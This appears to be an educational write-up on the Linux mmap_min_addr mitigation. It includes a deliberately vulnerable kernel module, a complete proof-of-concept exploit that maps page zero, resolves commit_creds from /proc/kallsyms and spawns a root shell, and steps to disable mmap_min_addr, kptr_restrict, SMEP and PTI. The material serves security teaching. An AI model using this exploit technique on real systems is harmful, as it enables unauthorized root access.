
### Overview

**Protection mechanism:** Low address space to protect from user allocation (aka `mmap_min_addr`)

Available from kernel version: `2.6.29`

Feature can be set at compile time via `DEFAULT_MMAP_MIN_ADDR` config. Can be changed after boot using `/proc/sys/vm/mmap_min_addr`.

Excerpt from `mm/Kconfig`:

```
config DEFAULT_MMAP_MIN_ADDR
        int "Low address space to protect from user allocation"
	depends on MMU
        default 4096
        help
	  This is the portion of low virtual memory which should be protected
	  from userspace allocation.  Keeping a user from writing to low pages
	  can help reduce the impact of kernel NULL pointer bugs.

	  For most ia64, ppc64 and x86 users with lots of address space
	  a value of 65536 is reasonable and should cause no problems.
	  On arm and other archs it should not be higher than 32768.
	  Programs which use vm86 functionality or have some need to map
	  this low address space will need CAP_SYS_RAWIO or disable this
	  protection by setting the value to 0.

	  This value can be changed after boot using the
/proc/sys/vm/mmap_min_addr tunable.
```

Excerpt from `Documentation/sysctl/vm.txt`:

```
This file indicates the amount of address space  which a user process will
be restricted from mmapping.  Since kernel null dereference bugs could
accidentally operate based on the information in the first couple of pages
of memory userspace processes should not be allowed to write to them.  By
default this value is set to 0 and no protections will be enforced by the
security module.  Setting this value to something like 64k will allow the
vast majority of applications to work correctly and provide defense in depth
against future potential kernel bugs.
```

### Example ilustrating this protection mechanism

To ilustrate how `mmap_min_addr` works following vulnerable kernel module will be used:

*WARNING: following source code is vulnerable and pose security risk for your system do not use it on production system.*

Module vulnerable to `NULL pointer dereference`:

```
cat > null-deref-mod.c <<'EOF'
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/uaccess.h>
#include <linux/debugfs.h>
#include <linux/slab.h>
#include <linux/miscdevice.h>

#define NULLDEREF_IOCTL_BASE 'D'
#define TRIGGER_NULL_DEREF _IO(NULLDEREF_IOCTL_BASE, 1)

long null_deref_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
    int retval;
    char *kdata;

    if(cmd == TRIGGER_NULL_DEREF) {
        struct Ops {
			ssize_t (*do_it)(void);
		};
		static struct Ops *ops = NULL;

        printk(KERN_INFO "null-deref: trigerring vuln\n");

        /* [1] dereferencing NULL pointer */
		return ops->do_it();
    }
}

int null_deref_open(struct inode *in_node, struct file *filp)
{
	printk(KERN_INFO "null-deref device was opened\n");
	return 0;
}

int null_deref_release(struct inode *inode, struct file *filp)
{
	printk(KERN_INFO "null-deref device was closed\n");
	return 0;
}

struct file_operations null_deref_fops = {
    .owner  = THIS_MODULE,
    .open   = null_deref_open,
    .release= null_deref_release,
    .unlocked_ioctl = null_deref_ioctl,
    .compat_ioctl = null_deref_ioctl
};

static struct miscdevice null_deref_misc = {
    .minor = MISC_DYNAMIC_MINOR,
	.name = "null-deref",
	.fops = &null_deref_fops,
};

int init_module(void)
{
	int result;

	printk(KERN_INFO "null-deref module loaded\n");

	result = misc_register(&null_deref_misc);
	if (unlikely(result)) {
		printk(KERN_ERR "failed to register misc device.\n");
		return result;
	} 

	return 0;
}

void cleanup_module(void)
{
	int result;
	misc_deregister(&null_deref_misc);

	printk(KERN_INFO "null-deref module unloaded\n");
}

MODULE_LICENSE("GPL");
EOF
```


PoC exploit code:


```
cat > null-deref-exp.c <<'EOF'
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>

#define NULLDEREF_IOCTL_BASE 'D'
#define TRIGGER_NULL_DEREF _IO(NULLDEREF_IOCTL_BASE, 1)

/*
assumptions:
- kernel 2.6.29 or newer is required (older kernels doesn't support prepare_kernel_cred & commit_creds)
- vm.mmap_min_addr=0 (mmapping 0-page has to be possible)
- kernel.kptr_restrict=0 (unprivilaged process has to be able to read /proc/kallsyms)
- SMEP needs to be turned off ('nosmep' kernel boot parameter has to be provided)
- on kernels 4.15+ PTI (page tables isolation) needs to be disabled ('pti=off' kernel boot parameter), because in kernel space user space pages are mapped as non-executable
*/

/* declare needed kernel's structures */
struct cred;
struct task_struct;

/* define proper kernel's function pointers */
typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)
__attribute__((regparm(3)));
typedef int (*commit_creds_t)(struct cred *new)
__attribute__((regparm(3)));
prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;

/* function finds provided kernel symbol in /proc/kallsyms */
void *get_ksym(char *name) {
	FILE *f = fopen("/proc/kallsyms", "rb");
	char c, sym[512];
	void *addr;
	int ret;

	while(fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0)
		if (!strcmp(sym, name))
			return addr;
	return NULL;
}

/* function will be executed in kernel mode. */
void get_root(void) {
	commit_creds(prepare_kernel_cred(0));
}

int main()
{
	void *res;
    int fd;

    fd = open("/dev/null-deref", O_RDONLY);

	if(fd < 0) {
		printf("[-] failed to initialize.\n");
		return 1;
	}

	// get kernel pointers
	prepare_kernel_cred = get_ksym("prepare_kernel_cred");
	commit_creds        = get_ksym("commit_creds");

	if (!(prepare_kernel_cred && commit_creds)) {
		fprintf(stderr, "Kernel symbols not found. "
				"Is your kernel older than 2.6.29?\n");
		return 1;
	}

	// mmap zero page
	res = mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,
			MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
	if(res == MAP_FAILED) {
		printf("failed to mmap 0 page\n");
		return 1;
	}

	// declare pointer to pointer at NULL
	void (**fn)(void) = NULL;

	// put a pointer to get_root at NULL
	*fn = get_root;

	// trigger null pointer dereference in kernel
    ioctl(fd, TRIGGER_NULL_DEREF);

    close(fd);

	if (!getuid()) {
		char *argv[] = {"/bin/sh", NULL};
		execve("/bin/sh", argv, NULL);
	}

	printf("Something went wrong\n");

	return 0;
}
EOF
```


Makefile:


```
cat > Makefile <<'EOF'
obj-m += null-deref.o

CC=$HOME/SEC-RES/gcc7/install/bin/gcc

all:

    make -C $HOME/SEC-RES/modules/lib/modules/4.16.0+/build M=`pwd` modules
EOF
```

Building:

```
# compiling kernel and installing modules in directory of choice (here in $HOME/SEC-RES/modules):
cd SEC-RES
mkdir modules
cd kernel-research
make
make INSTALL_MOD_PATH=$HOME/SEC-RES/modules modules_install
cd ..

# compiling with gcc (custom built gcc here):
mkdir null-deref
cd null-deref
(null-deref-mod.c and Makefile from above listings need to be copied here)
make CC=$HOME/SEC-RES/gcc7/install/bin/gcc -C ../modules/lib/modules/4.16.0+/build M=`pwd` modules
```

Before running the exploit let's make sure that other kernel/hardware protection mechanism do not interfere with our experiment:

```
# First let's turn off mmap_min_addr:
- vm.mmap_min_addr=0 (mmapping 0-page has to be possible)

# For the sake of convinience kptr_restrict is turned off which allows us to get addresses of
- kernel.kptr_restrict=0 (unprivilaged process has to be able to read /proc/kallsyms)

# SMEP needs to be turned off ('nosmep' kernel boot parameter has to be provided)

# on kernels 4.15+ PTI (page tables isolation) needs to be disabled (pti=off kernel parameter), because with PTI in kernel context userland pages are mapped as non-executable
```

### Associated vulnerabilities
